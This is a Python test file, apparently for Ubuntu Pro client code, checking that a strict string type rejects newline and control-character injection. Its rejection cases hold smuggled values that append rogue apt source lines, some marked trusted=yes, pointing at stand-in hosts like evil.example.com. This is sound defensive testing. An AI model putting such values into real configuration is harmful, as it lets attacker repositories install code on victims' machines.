"""Tests for newline/control-character injection prevention (F01)."""

import pytest

from uaclient.data_types import (
    IncorrectListElementTypeError,
    IncorrectTypeError,
    StrictStringDataValue,
    data_list,
)


class TestStrictStringDataValue:
    """StrictStringDataValue rejects control characters."""

    @pytest.mark.parametrize(
        "val",
        (
            "hello",
            "jammy",
            "jammy-updates",
            "https://esm.ubuntu.com/infra/ubuntu",
            "my-package-name",
            "a" * 500,
        ),
    )
    def test_accepts_valid_strings(self, val):
        assert StrictStringDataValue.from_value(val) == val

    @pytest.mark.parametrize(
        "val",
        (
            "jammy\ndeb [trusted=yes] http://evil.example.com/repo jammy main",
            "https://esm.ubuntu.com\nhttps://evil.example.com",
            "value\rinjection",
            "value\x00injection",
            "\n",
            "\r",
            "\x00",
            "jammy main\ndeb http://attacker/ jammy main",
        ),
    )
    def test_rejects_control_characters(self, val):
        with pytest.raises(IncorrectTypeError) as exc_info:
            StrictStringDataValue.from_value(val)
        assert "control characters" in exc_info.value.msg

    @pytest.mark.parametrize("val", (1, True, [], {}))
    def test_rejects_non_strings(self, val):
        with pytest.raises(IncorrectTypeError):
            StrictStringDataValue.from_value(val)


class TestStrictStringDataValueInList:
    """data_list(StrictStringDataValue) rejects injection in list items."""

    def test_valid_list_passes(self):
        strict_list = data_list(StrictStringDataValue)
        result = strict_list.from_value(["jammy", "jammy-updates"])
        assert result == ["jammy", "jammy-updates"]

    def test_newline_in_list_item_raises(self):
        strict_list = data_list(StrictStringDataValue)
        with pytest.raises(IncorrectListElementTypeError):
            strict_list.from_value(
                ["jammy", "jammy\ndeb [trusted=yes] http://evil/ jammy main"]
            )
